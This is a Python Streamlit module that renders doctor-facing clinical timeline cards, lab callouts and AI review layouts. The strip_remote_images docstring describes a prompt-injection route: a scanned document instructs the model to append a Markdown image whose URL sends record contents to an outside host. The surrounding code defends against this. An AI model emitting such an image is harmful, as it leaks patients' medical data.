"""Doctor-friendly visual presentation components for Clinical Timeline and AI Review.

Provides high-readability cards, abnormal lab callouts, clean document summaries,
and executive longitudinal review layouts tailored for clinical review.
"""
import html
import re
import streamlit as st

from core.config import flag


def esc(value) -> str:
    """Safely escape a value for HTML interpolation.

    When ENABLE_STRICT_HTML_SANITIZATION is False, preserves raw string behavior.
    When True, converts None to empty string and escapes HTML entities.
    """
    if not flag("ENABLE_STRICT_HTML_SANITIZATION"):
        return str(value) if value is not None else ""
    if value is None:
        return ""
    return html.escape(str(value))


# `![alt](url)`, `![alt][ref]` and `![ref]`; plus raw <img> tags in case HTML is ever allowed.
_MD_IMAGE = re.compile(r"!\[[^\]]*\](?:\s*\([^)]*\)|\s*\[[^\]]*\])?")
_HTML_IMG = re.compile(r"<img\b[^>]*>", re.I)


def strip_remote_images(markdown) -> str:
    """Remove images from model- or OCR-derived Markdown before rendering it.

    The browser fetches an image URL as soon as the Markdown renders, so an
    instruction planted in a scanned document ("append ![](https://host/?d=...)")
    would send record contents to that host without any click. Images are never
    legitimate in these answers.
    """
    text = _MD_IMAGE.sub("(image removed)", str(markdown or ""))
    return _HTML_IMG.sub("(image removed)", text)


def _md_to_html(text: str) -> str:
    """Minimal safe markdown-to-HTML: bold, italic, escaped HTML only."""
    escaped = html.escape(text)
    # **bold**
    escaped = re.sub(r"\*\*(.+?)\*\*", r"<strong>\1</strong>", escaped)
    # *italic*
    escaped = re.sub(r"\*(.+?)\*", r"<em>\1</em>", escaped)
    return escaped


# ── Laboratory Text Cleaners ─────────────────────────────────────────────────
_FOOTNOTE_PATTERNS = [
    re.compile(r"\b(?:endorsed by clinical groups|guidelines? \d{4}|biological reference range|cut-off point of)\b.*", re.I),
    re.compile(r"\bsample type:\s*\w+.*?(?:method\b|$)", re.I),
    re.compile(r"\bnormal\s*<\s*\d+.*?very high\s*>\s*\d+\b", re.I),
]


def clean_clinical_impression(text: str) -> str:
    """Clean laboratory report boilerplate and disclaimers from clinical impressions."""
    if not text:
        return ""
    clean = str(text).strip()
    if re.search(r"\b(?:endorsed by clinical groups|guidelines? 2012|biological reference range)\b", clean, re.I):
        return "Lab Reference Note: ADA reference range & diagnostic thresholds for HbA1c."
    if re.search(r"\b(?:sample type:\s*serum|method gpo-tops)\b", clean, re.I):
        return "Lab Reference Note: Lipid profile methodology & reference intervals."
    if re.search(r"\bthe most common cause of elevated glucose levels is diabetes\b", clean, re.I):
        # Extract symptoms if mentioned in the footnote
        if "excessive thirst" in clean.lower():
            return "Educational Lab Note: Symptoms of glycemic dysregulation (thirst, fatigue, blurred vision)."
        return "Educational Lab Note: Common causes of glycemic variation."
    return clean


# ── AI Review Parser & Renderer ──────────────────────────────────────────────
# Review section heading -> parsed key. Headings of older cached reviews map onto the current keys.
_REVIEW_KEYS = {
    "overview": "overview",
    "overall pattern": "overview",
    "clinical insights": "insights",
    "key insights": "insights",
    "risks and medication considerations": "insights",
    "follow-up needs": "insights",
    "review points": "insights",
    "abnormal results": "abnormal_results",
    "evidence": "evidence",
}


# Brief themes: (icon, accent colour, full-width card). A theme the model names differently gets the default.
_BRIEF_THEMES = {
    "course": ("🗓️", "#104eb2", False),
    "conditions": ("🩺", "#029c89", False),
    "key findings": ("⚠️", "#d32f2f", True),
    "treatment": ("💊", "#c77700", False),
    "gaps to check": ("🔎", "#7c3aed", False),
}
_BRIEF_DEFAULT = ("📌", "#3B82F6", True)


def _point_html(point: str) -> str:
    """A point, with a short leading label ('Active:', 'HbA1c above range:') in bold."""
    label = re.match(r"^([^:]{2,60}?):\s+(.+)$", point)
    if label and len(label.group(1).split()) <= 7 and "**" not in label.group(1):
        return f"<b>{html.escape(label.group(1))}:</b> {_md_to_html(label.group(2))}"
    return _md_to_html(point)


# ── Clinical Timeline Visual Encounter Renderer ─────────────────────────────
def render_clinical_encounter(idx: int, visit: dict, med_shifts_for_visit: list):
    """Render a single clinical visit compactly with high visual doctor-friendliness."""
    v_date = (visit.get("visit_date") or "Unspecified")[:10]
    v_id = str(visit.get("visit_id", f"V{idx}"))

    # Diagnoses
    confirmed_dx = [
        str(d).strip() for d in (visit.get("db_confirmed_dx"), visit.get("confirmed_diagnosis"))
        if d and str(d).strip() and str(d).strip().lower() not in ("—", "-", "none", "not documented")
    ]
    confirmed_dx = list(dict.fromkeys(confirmed_dx))

    provisional_dx = [
        str(d).strip() for d in (visit.get("db_provisional_dx"), visit.get("provisional_diagnosis"))
        if d and str(d).strip() and str(d).strip().lower() not in ("—", "-", "none", "not documented")
    ]
    provisional_dx = list(dict.fromkeys(provisional_dx))

    # Labs: Partition into Abnormal and Normal
    raw_labs = visit.get("lab_results", []) or []
    abnormal_labs = []
    normal_labs = []
    for l in raw_labs:
        name = str(l.get("test_name", "")).strip()
        val = str(l.get("value", "")).strip()
        ref = str(l.get("reference", "")).strip()
        status = str(l.get("status", "")).strip()
        status_low = status.lower()

        if any(k in status_low for k in ("abnormal", "high", "low")):
            abnormal_labs.append({"name": name, "val": val, "ref": ref, "status": status})
        else:
            normal_labs.append(f"{name} ({val})")

    # Documents: Partition into Documents with Findings vs Pure Routine
    docs = visit.get("documents", []) or []
    active_docs = []
    routine_doc_count = 0

    for doc in docs:
        label = doc.get("document_label", "Clinical Document")
        doc_id = str(doc.get("doc_id", ""))
        short_id = f"...{doc_id[-8:]}" if len(doc_id) > 10 else doc_id
        cs = doc.get("clinical_summary", {}) or {}

        impression = clean_clinical_impression(cs.get("clinical_impression", ""))
        symptoms = cs.get("symptoms", []) or []
        cc = cs.get("chief_complaint", "")
        ai_assisted = bool(cs.get("ai_assisted_fields") or (cs.get("extraction_stats") or {}).get("ai_assisted"))

        has_findings = bool(impression or symptoms or ai_assisted or (cc and cc != visit.get("chief_complaint")))
        if has_findings:
            active_docs.append({
                "label": label,
                "short_id": short_id,
                "impression": impression,
                "symptoms": symptoms,
                "cc": cc,
                "ai_assisted": ai_assisted,
            })
        else:
            routine_doc_count += 1

    # Follow-up badge
    fus = visit.get("followups", []) or []
    fu_badges = []
    for fu in fus:
        st_val = str(fu.get("status", "")).upper()
        f_date = str(fu.get("scheduled_date", ""))
        if "MISSED" in st_val:
            fu_badges.append(f'<span class="badge-missed">🚨 Follow-up Missed: {f_date}</span>')
        elif "COMPLETED" in st_val:
            fu_badges.append(f'<span class="badge-completed">✅ Follow-up Completed: {f_date}</span>')
        else:
            fu_badges.append(f'<span class="badge-pending">📅 Scheduled: {f_date} ({st_val})</span>')

    # Header title for expander
    header_title = f"🗓️ Visit #{idx} — {v_date} (Visit ID: {v_id[:8]}...{v_id[-4:]})"

    with st.expander(header_title, expanded=True):
        # 1. Chief Complaint & Diagnoses
        cc = visit.get("db_chief_complaint") or visit.get("chief_complaint") or "Routine visit / Not documented"
        st.markdown(
            f'<div style="margin-bottom: 0.6rem;">'
            f'<span style="font-weight: 700; color: #104eb2; font-size: 0.90rem; text-transform: uppercase; letter-spacing: 0.05em;">Chief Complaint:</span>'
            f'<span style="font-weight: 600; font-size: 0.95rem; margin-left: 6px;">{html.escape(cc)}</span>'
            f'</div>',
            unsafe_allow_html=True,
        )

        # Diagnoses Badges
        dx_badges_html = []
        for cd in confirmed_dx:
            dx_badges_html.append(f'<span class="badge-confirmed">🎯 Confirmed: {html.escape(cd)}</span>')
        for pd in provisional_dx:
            dx_badges_html.append(f'<span class="badge-provisional">📋 Provisional: {html.escape(pd)}</span>')

        if dx_badges_html:
            st.markdown(f'<div style="margin-bottom: 0.75rem;">{" ".join(dx_badges_html)}</div>', unsafe_allow_html=True)

        st.markdown("<hr style='margin: 0.5rem 0 0.8rem 0; opacity: 0.15;' />", unsafe_allow_html=True)

        # 2. Split Columns: Document Findings (Left) & Laboratory Findings (Right)
        col_docs, col_labs = st.columns([1.1, 1.0])

        with col_docs:
            st.markdown('<div class="encounter-subheading">📄 Clinical Documents & Extraction</div>', unsafe_allow_html=True)
            if not docs:
                st.markdown("<p style='font-size:0.85rem; color:#5b6474; font-style:italic;'>No documents attached to this visit (Direct database entry).</p>", unsafe_allow_html=True)
            elif not active_docs:
                st.markdown(f"<div class='doc-clean-card'><span style='color:#5b6474; font-size:0.86rem;'>📄 {len(docs)} verified clinical documents processed (no narrative notes).</span></div>", unsafe_allow_html=True)
            else:
                for ad in active_docs:
                    symptom_chips = "".join(
                        f'<span class="symptom-chip">🔹 {html.escape(s)}</span>'
                        for s in ad["symptoms"] if s
                    )
                    # Determine document type icon
                    lbl_low = ad["label"].lower()
                    if any(k in lbl_low for k in ("lab", "report", "blood", "urine", "pathol")):
                        doc_icon = "🧪"
                    elif any(k in lbl_low for k in ("prescription", "rx", "medic")):
                        doc_icon = "💊"
                    elif any(k in lbl_low for k in ("discharge", "summary", "admit")):
                        doc_icon = "🏥"
                    elif any(k in lbl_low for k in ("referral", "consult")):
                        doc_icon = "📨"
                    else:
                        doc_icon = "📄"

                    impr_block = ""
                    if ad["impression"]:
                        safe_impr = html.escape(str(ad["impression"]).strip()).replace("\n", "<br>")
                        impr_block = (
                            '<div style="margin-top:7px;">'
                            '<div style="font-size:0.72rem; font-weight:700; text-transform:uppercase; '
                            'letter-spacing:0.05em; color:#5b6474; margin-bottom:3px;">Clinical Impression</div>'
                            f'<div style="font-size:0.875rem; line-height:1.55; color:inherit;">{safe_impr}</div>'
                            '</div>'
                        )

                    symptom_block = (
                        f'<div style="margin-top:8px; display:flex; flex-wrap:wrap; gap:3px;">{symptom_chips}</div>'
                        if symptom_chips else ""
                    )
                    ai_badge = '<span style="font-size:0.68rem; color:#c77700; border:1px solid #c77700; border-radius:4px; padding:1px 5px; margin-left:6px;">AI-assisted; verify</span>' if ad.get("ai_assisted") else ""

                    document_card = (
                        '<div class="doc-clean-card">'
                        '<div style="display:flex; justify-content:space-between; align-items:center;">'
                        '<div style="display:flex; align-items:center; gap:6px;">'
                        f'<span style="font-size:1.1rem;">{doc_icon}</span>'
                        f'<span class="doc-label-badge">{html.escape(ad["label"])}</span>{ai_badge}'
                        '</div>'
                        f'<span class="doc-id-badge">ID: {html.escape(ad["short_id"])}</span>'
                        '</div>'
                        f'{impr_block}{symptom_block}'
                        '</div>'
                    )
                    st.markdown(document_card, unsafe_allow_html=True)

                if routine_doc_count > 0:
                    st.markdown(
                        f"<div style='font-size:0.78rem; color:#5b6474; margin-top:4px;'>"
                        f"+ {routine_doc_count} routine documents (no narrative notes).</div>",
                        unsafe_allow_html=True,
                    )

        with col_labs:
            st.markdown('<div class="encounter-subheading">🧪 Laboratory Investigations</div>', unsafe_allow_html=True)
            if not raw_labs:
                st.markdown("<p style='font-size:0.85rem; color:#5b6474; font-style:italic;'>No laboratory investigations recorded for this visit.</p>", unsafe_allow_html=True)
            else:
                if abnormal_labs:
                    st.markdown(f"<div style='font-size:0.80rem; font-weight:700; color:#EF4444; margin-bottom:4px;'>⚠️ ABNORMAL FINDINGS ({len(abnormal_labs)}):</div>", unsafe_allow_html=True)
                    for ab in abnormal_labs:
                        ref_str = f" <span style='font-size:0.75rem; color:#5b6474;'>(Ref: {html.escape(ab['ref'])})</span>" if ab['ref'] else ""
                        lab_card = (
                            '<div class="lab-abnormal-card">'
                            f'<span style="font-weight:650; color:#a61b1b;">{html.escape(ab["name"])}:</span> '
                            f'<span style="font-weight:700; margin: 0 4px;">{html.escape(ab["val"])}</span> '
                            f'<span class="lab-status-tag">{html.escape(ab["status"])}</span>'
                            f'{ref_str}'
                            '</div>'
                        )
                        st.markdown(lab_card, unsafe_allow_html=True)
                else:
                    st.markdown("<div style='font-size:0.82rem; color:#1b873f; font-weight:600; margin-bottom:4px;'>✅ All reported laboratory parameters within normal range.</div>", unsafe_allow_html=True)

                if normal_labs:
                    with st.expander(f"✅ View {len(normal_labs)} Normal Parameters", expanded=False):
                        st.caption(", ".join(normal_labs))

        st.markdown("<hr style='margin: 0.6rem 0; opacity: 0.15;' />", unsafe_allow_html=True)

        # 3. Bottom Row: Medication Shifts & Follow-up Action
        col_meds, col_fu = st.columns([1.2, 0.8])
        with col_meds:
            st.markdown('<div class="encounter-subheading">💊 Medication Shifts in this Visit</div>', unsafe_allow_html=True)
            specs = visit.get("prescriber_specializations") or []
            if specs:  # specialization of the prescribing doctor(s) only, never a name
                st.markdown("<div style='font-size:0.82rem; color:#475569; margin-bottom:4px;'>Prescribed by: "
                            + " · ".join(f"<b>{html.escape(s)}</b>" for s in specs) + "</div>", unsafe_allow_html=True)
            if med_shifts_for_visit:
                for ch in med_shifts_for_visit:
                    ch_type = ch.get("type", "")
                    ch_text = ch.get("text", "")
                    if ch_type == "started":
                        badge = '<span class="diff-badge-added">Started</span>'
                    elif ch_type == "restarted":
                        badge = '<span class="diff-badge-added">Restarted</span>'
                    elif ch_type == "dose_changed":
                        badge = '<span class="diff-badge-changed">Dose Changed</span>'
                    elif ch_type == "continued":
                        badge = '<span class="diff-badge-stable">Continued</span>'
                    elif ch_type == "discontinued":
                        badge = '<span class="diff-badge-removed">Discontinued</span>'
                    else:
                        badge = '<span class="diff-badge-stable">Documented</span>'
                    st.markdown(f"<div style='margin-bottom:3px; font-size:0.86rem;'>{badge} <span style='margin-left:5px;'>{html.escape(ch_text)}</span></div>", unsafe_allow_html=True)
            else:
                rx_list = visit.get("db_medications", [])
                if rx_list:
                    med_names = ", ".join(m.get("name", "") for m in rx_list if m.get("name"))
                    st.markdown(f"<div style='font-size:0.86rem; color:#5b6474;'>Active Prescriptions: {html.escape(med_names)}</div>", unsafe_allow_html=True)
                else:
                    st.markdown("<div style='font-size:0.85rem; color:#5b6474; font-style:italic;'>No medication adjustments or prescriptions documented.</div>", unsafe_allow_html=True)

        with col_fu:
            st.markdown('<div class="encounter-subheading">📅 Visit Disposition / Follow-up</div>', unsafe_allow_html=True)
            if fu_badges:
                st.markdown(" ".join(fu_badges), unsafe_allow_html=True)
            else:
                st.markdown("<div style='font-size:0.85rem; color:#5b6474; font-style:italic;'>No subsequent follow-up scheduled.</div>", unsafe_allow_html=True)


# ── Documents Not Linked to a Visit ──────────────────────────────────────────
def unlinked_link_text(doc) -> str:
    """Short description of where an unlinked document probably belongs."""
    match = doc.get("likely_visit")
    if match:
        return f"likely Visit #{match['visit_index']} ({match['visit_date']})"
    candidates = doc.get("candidate_visits") or []
    if candidates:
        return "possible Visits " + ", ".join(f"#{c['visit_index']} ({c['visit_date']})" for c in candidates)
    return "no matching visit found"


def render_unlinked_documents(docs: list, heading: str = None, caption: str = None, expanded=None):
    """Show documents with no visit_id with the same findings as visit documents,
    plus the visit(s) they most likely belong to."""
    if not docs:
        return
    if heading is None:
        heading = f"📎 Documents Not Linked to a Visit ({len(docs)})"
    if heading:
        st.markdown(f'<div class="ai-section-hdr">{html.escape(heading)}</div>', unsafe_allow_html=True)
    if caption is None:
        caption = ("These documents have no visit ID in the record. Possible visits are suggested from matching "
                   "medicines, diagnoses, lab types and dates; verify before relying on them.")
    if caption:
        st.caption(caption)
    for doc in docs:
        cs = doc.get("clinical_summary") or {}
        match = doc.get("likely_visit")
        candidates = doc.get("candidate_visits") or []
        doc_id = str(doc.get("doc_id", ""))
        labs = doc.get("lab_results") or []
        abnormal = [l for l in labs if any(k in str(l.get("status", "")).lower() for k in ("abnormal", "high", "low"))]
        title = f"📄 {doc.get('document_label', 'Document')} · ID ...{doc_id[-8:]} → {unlinked_link_text(doc)}"
        if abnormal:
            title += f" · ⚠️ {len(abnormal)} abnormal lab(s)"
        with st.expander(title, expanded=bool(abnormal) or not (match or candidates) if expanded is None else expanded):
            refs = [match] if match else candidates
            if refs:
                label = "Likely linked visit" if match else "Possible visits (equally likely)"
                lines = "<br>".join(
                    f"Visit #{r['visit_index']} · {html.escape(r['visit_date'])} · ID {html.escape(r['visit_id'])}"
                    for r in refs)
                st.markdown(
                    f'<div class="ai-insight-card"><div class="ai-tag" style="color:#104eb2;">🔗 {label}</div>'
                    f'<div class="ai-insight-text">{lines}<br><small>Matched on: {html.escape("; ".join(refs[0]["reasons"]))}</small></div></div>',
                    unsafe_allow_html=True,
                )
            else:
                st.markdown("<div class='doc-clean-card'><span style='color:#5b6474; font-size:0.86rem;'>"
                            "Not matched to any visit; findings are shown as documented.</span></div>", unsafe_allow_html=True)
            fields = [
                ("Age / Sex", cs.get("age_sex")),
                ("Chief Complaint", cs.get("chief_complaint")),
                ("Clinical Impression", clean_clinical_impression(cs.get("clinical_impression") or "")),
                ("Provisional Diagnosis", cs.get("provisional_diagnosis")),
                ("Confirmed Diagnosis", cs.get("confirmed_diagnosis")),
                ("Symptoms", ", ".join(cs.get("symptoms") or [])),
                ("Medicines", ", ".join(doc.get("medications_found") or [])),
                ("Vitals", ", ".join(f"{v.get('label')}: {v.get('value')}" for v in cs.get("vitals") or [])),
                ("Follow-up", cs.get("follow_up")),
                ("Notes", "; ".join(cs.get("clinical_notes") or [])),
            ]
            rows = [f"<div class='field-row'><span class='field-name'>{k}:</span> <span class='field-val'>{html.escape(str(v))}</span></div>"
                    for k, v in fields if v]
            if rows:
                st.markdown("".join(rows), unsafe_allow_html=True)
            if labs:
                st.markdown('<div class="encounter-subheading">🧪 Laboratory Results</div>', unsafe_allow_html=True)
                if abnormal:
                    st.markdown(f"<div style='font-size:0.80rem; font-weight:700; color:#EF4444; margin-bottom:4px;'>⚠️ ABNORMAL FINDINGS ({len(abnormal)}):</div>", unsafe_allow_html=True)
                for ab in abnormal:
                    ref = f" <span style='font-size:0.75rem; color:#5b6474;'>(Ref: {html.escape(str(ab.get('reference', '')))})</span>" if ab.get("reference") else ""
                    st.markdown(
                        '<div class="lab-abnormal-card">'
                        f'<span style="font-weight:650; color:#a61b1b;">{html.escape(str(ab.get("test_name", "")))}:</span> '
                        f'<span style="font-weight:700; margin:0 4px;">{html.escape(str(ab.get("value", "")))}</span> '
                        f'<span class="lab-status-tag">{html.escape(str(ab.get("status", "")))}</span>{ref}</div>',
                        unsafe_allow_html=True,
                    )
                others = [f"{l.get('test_name')} ({l.get('value')}{', ' + str(l.get('status')) if l.get('status') else ''})"
                          for l in labs if l not in abnormal]
                if others:
                    st.caption(("Other results: " if abnormal else "✅ No abnormal flags. Results: ") + ", ".join(others))
            if not rows and not labs:
                st.markdown("<p style='color:#5b6474; font-style:italic;'>No structured findings could be extracted from this document.</p>", unsafe_allow_html=True)
            stats = cs.get("extraction_stats") or {}
            st.caption(f"Extraction: {stats.get('total_lines', 0)} lines, {stats.get('garbled_lines', 0)} unreadable, {stats.get('extracted_fields', 0)} fields extracted.")


# ── 30-second Clinical Snapshot (AI Analysis tab) ───────────────────────────
_SNAPSHOT_CSS = """
<style>
.snap-card { background:#ffffff; border:1px solid #dfe6f2; border-radius:12px; padding:14px 18px; margin-bottom:1rem;
             box-shadow:0 2px 10px rgba(16,78,178,0.07); color:#1f2937; }
.snap-head { font-size:0.95rem; margin-bottom:10px; line-height:1.6; color:#0f2a5f; }
.snap-chip { display:inline-block; padding:1px 9px; border-radius:999px; font-size:0.78rem; font-weight:700;
             background:#e8effb; color:#104eb2; border:1px solid #c9d8f3; margin-right:4px; }
.snap-sec { font-size:0.72rem; font-weight:700; letter-spacing:0.07em; text-transform:uppercase; color:#5b6474; margin:12px 0 6px; }
.snap-flag { display:flex; gap:10px; align-items:baseline; padding:7px 11px; border-radius:8px; margin-bottom:5px;
             font-size:0.88rem; line-height:1.45; color:#1f2937; }
.snap-high { background:#fdecec; border-left:4px solid #d32f2f; }
.snap-high b { color:#a61b1b; }
.snap-medium { background:#fff4e2; border-left:4px solid #ff9800; }
.snap-medium b { color:#a35a00; }
.snap-flag b { white-space:nowrap; }
.snap-sig { color:#5b6474; font-style:italic; }
.snap-info { display:inline-block; font-size:0.78rem; color:#3b4352; background:#f3f6fc; border:1px solid #dfe6f2;
             border-radius:999px; padding:2px 10px; margin:0 6px 6px 0; }
.snap-tl { overflow-x:auto; }
.snap-row { display:flex; align-items:center; gap:8px; margin-bottom:3px; font-size:0.8rem; color:#1f2937; }
.snap-label { width:230px; min-width:230px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
.snap-cell { width:30px; height:18px; min-width:30px; border-radius:4px; background:#f1f4f9; border:1px solid #d5ddeb; }
.snap-colhead { width:30px; min-width:30px; text-align:center; font-size:0.66rem; line-height:1.15; color:#5b6474; }
.snap-colhead b { display:block; color:#0f2a5f; font-size:0.72rem; }
.snap-legend { font-size:0.74rem; color:#5b6474; margin:4px 0 2px 238px; display:flex; gap:14px; flex-wrap:wrap; }
.snap-key { display:inline-block; width:12px; height:12px; border-radius:3px; vertical-align:-2px; margin-right:4px; }
.snap-on { background:#029c89; border-color:#029c89; }
.snap-alert { background:#d32f2f; border-color:#d32f2f; }
.snap-axis { display:flex; justify-content:space-between; font-size:0.72rem; color:#5b6474; margin-left:238px; }
.snap-guide { display:flex; gap:10px; align-items:baseline; padding:5px 11px; border-bottom:1px solid #edf1f7; font-size:0.85rem;
              line-height:1.45; color:#1f2937; }
.snap-guide b { white-space:nowrap; color:#0f2a5f; }
.snap-status { white-space:nowrap; font-size:0.74rem; font-weight:700; padding:1px 8px; border-radius:999px;
               background:#e8effb; color:#104eb2; border:1px solid #c9d8f3; }
.snap-src { color:#5b6474; font-size:0.74rem; }
.snap-guide.snap-draft { background:#fffbf0; }
.snap-verify { white-space:nowrap; font-size:0.7rem; font-weight:700; padding:1px 7px; border-radius:4px; }
.snap-verify.ok { background:#e7f6ec; color:#1b6b3a; border:1px solid #b9e2c6; }
.snap-verify.draft { background:#fff3d6; color:#8a5a00; border:1px solid #f0d58f; }
.snap-group { font-size:0.78rem; font-weight:700; color:#0f2a5f; margin:10px 0 4px; padding-left:2px; }
.snap-group span { font-weight:500; color:#5b6474; }
.snap-num { display:inline-block; min-width:20px; font-weight:700; color:#0f2a5f; margin-right:6px; }
.snap-guide-box { margin:12px 0 4px; border:1px solid #dfe6f2; border-radius:8px; background:#fbfcfe; }
.snap-guide-box > summary { cursor:pointer; padding:7px 12px; font-size:0.72rem; font-weight:700; letter-spacing:0.07em;
                            text-transform:uppercase; color:#5b6474; }
.snap-guide-box[open] > summary { border-bottom:1px solid #edf1f7; }
.snap-guide-note { font-size:0.74rem; color:#8a5a00; padding:4px 11px 6px; }
.snap-tiles { display:flex; flex-wrap:wrap; gap:8px; margin:4px 0 10px; }
.snap-tile { flex:1 1 130px; min-width:120px; max-width:200px; border-radius:10px; padding:8px 10px; border:1px solid;
             text-decoration:none !important; color:#1f2937 !important; display:block; }
.snap-tile .t-label { font-size:0.7rem; font-weight:700; letter-spacing:0.05em; text-transform:uppercase; }
.snap-tile .t-value { font-size:0.86rem; font-weight:650; margin-top:2px; line-height:1.3; }
.snap-tile .t-dot { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:5px; vertical-align:1px; }
.snap-tile.red { background:#fdecec; border-color:#f3b4b4; } .snap-tile.red .t-dot { background:#d32f2f; } .snap-tile.red .t-label { color:#a61b1b; }
.snap-tile.amber { background:#fff4e2; border-color:#f6cf94; } .snap-tile.amber .t-dot { background:#ff9800; } .snap-tile.amber .t-label { color:#a35a00; }
.snap-tile.green { background:#e7f6ec; border-color:#b9e2c6; } .snap-tile.green .t-dot { background:#1b873f; } .snap-tile.green .t-label { color:#1b6b3a; }
.snap-tile.grey { background:#f3f5f8; border-color:#d5ddeb; } .snap-tile.grey .t-dot { background:#9aa3b2; } .snap-tile.grey .t-label { color:#5b6474; }
details.snap-flag { display:block; }
details.snap-flag summary { cursor:pointer; list-style:none; }
details.snap-flag summary::-webkit-details-marker { display:none; }
.snap-more { float:right; font-size:0.72rem; color:#5b6474; margin-left:8px; }
.snap-full { font-size:0.82rem; color:#3b4352; margin-top:6px; padding-top:6px; border-top:1px dashed #d5ddeb; }
.snap-error { background:#f3f5f8; border-left:4px solid #9aa3b2; color:#5b6474; }
.snap-error b { color:#5b6474; }
</style>
"""


_COURSE_CSS = """
<style>
.course-card { background:#ffffff; border:1px solid #dfe6f2; border-radius:12px; padding:14px 18px; margin-bottom:1rem;
               box-shadow:0 2px 10px rgba(16,78,178,0.07); color:#1f2937; }
.course-head { font-size:0.95rem; line-height:1.55; color:#0f2a5f; margin-bottom:12px; }
.course-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(260px, 1fr)); gap:12px; margin-bottom:12px; }
.course-col { background:#f5f8fd; border:1px solid #e3e9f4; border-radius:10px; padding:10px 12px; }
.course-col h4 { margin:0 0 6px; font-size:0.74rem; font-weight:700; letter-spacing:0.07em; text-transform:uppercase; }
.course-col ul { margin:0; padding-left:1.05rem; font-size:0.84rem; line-height:1.5; }
.course-col li { margin-bottom:3px; }
.course-consistent h4 { color:#1b873f; } .course-dx h4 { color:#104eb2; } .course-med h4 { color:#a35a00; }
.course-tl-row { display:flex; gap:12px; align-items:baseline; padding:6px 0; border-top:1px solid #edf1f7; font-size:0.85rem; line-height:1.45; }
.course-month { min-width:118px; font-weight:700; color:#104eb2; white-space:nowrap; }
.course-month span { font-weight:500; color:#5b6474; font-size:0.76rem; margin-left:4px; }
.course-sec { font-size:0.72rem; font-weight:700; letter-spacing:0.07em; text-transform:uppercase; color:#5b6474; margin:4px 0 4px; }
</style>
"""


